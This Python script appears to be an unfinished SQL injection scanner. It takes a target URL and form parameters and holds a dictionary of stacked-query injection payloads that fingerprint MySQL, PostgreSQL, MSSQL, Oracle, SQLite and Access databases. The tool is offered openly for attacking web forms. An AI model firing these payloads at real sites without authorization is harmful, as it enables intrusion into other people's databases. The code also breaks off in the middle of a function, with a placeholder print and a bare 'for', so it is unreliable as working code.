import mechanize
import requests
from faker import Faker
import argparse

#argumets defined for script to work as it is designed
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Url to send the request.", type= str, required=True, )
parser.add_argument("--method", help="Method for sending the request.", default="GET", type= str)
parser.add_argument("--data", help="Data in case a post request. Ex. name=value,name2=value2", type= str,)

args = parser.parse_args()
method = str.upper(args.method)


#Payloads to find the dbms
#Each one works only on selected dialect
find_dbms_payloads = {
    "mysql": "'); select connection_id(); --",
    "postgresql": "'); select pg_client_encoding(); --",
    "mssql": "'); select @@CONNECTIONS; --",
    "oracle": "'); select RAWTOHEX('AB')=RAWTOHEX('AB'); --",
    "sqlite": "'); select sqlite_version(); --",
    "msacess": "'); select last_insert_rowid()>1; --"
}


# POST request
if(method == "POST"):
    #Check for data params
    if(not args.data):
        print("When POST method is specified you must pass the data argument")
    else: 
        
        dataArgs = args.data.split(",")
        print(dataArgs)
        postParams = {}
        for arg in dataArgs:
            arg = arg.split("=");
            postParams[arg[0]] = arg[1]
        print(postParams)
                    


#GET request    
elif(method == "GET"):
    #In case of a get reques we will send 6 requests 
    #for each payload in find_dbms_payloads
    print("ASfas")
else:
    print("Method got incorrect value")        



#In case of a post request which has a form that needs to send multiple params
#we have to send 6 * number of params requests to test if vulnerable and to find
#the dbms system
def permute_post_params(params):
    requests = {}
    length = len(params)
    for payload in find_dbms_payloads:
        minirequest = {}
        requests[payload]
        for
